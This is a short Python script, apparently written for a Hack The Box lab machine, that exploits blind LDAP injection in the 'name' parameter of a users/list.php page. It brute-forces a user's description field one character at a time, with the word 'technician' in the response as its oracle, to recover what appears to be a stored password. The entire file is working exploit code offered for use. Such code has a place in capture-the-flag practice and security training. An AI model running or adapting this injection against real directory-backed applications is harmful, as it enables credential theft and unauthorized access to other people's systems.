import requests
import string

def send_request(name):
    proxies = {
        'http' : 'http://127.0.0.1:8080' 
    }
    params = {
        'name': '*)(&(objectClass=user)(description='+name+'*)'
    }
    r = requests.get('http://internal.analysis.htb/users/list.php',params=params)
    return(r.text)

all_chars = string.digits+string.ascii_letters+string.punctuation

def brute(length):
    password = '97N'
    for i in range(length):
        for ascii_char in all_chars:
            req = send_request(password+ascii_char)
            if('technician' in req):
                password += ascii_char
                print(str(i)+':    '+password)
                break

            elif(ascii_char=='~' and 'technician' not in req):
                password += '*'
                print(str(i)+':    '+password)
                break

print(brute(20))
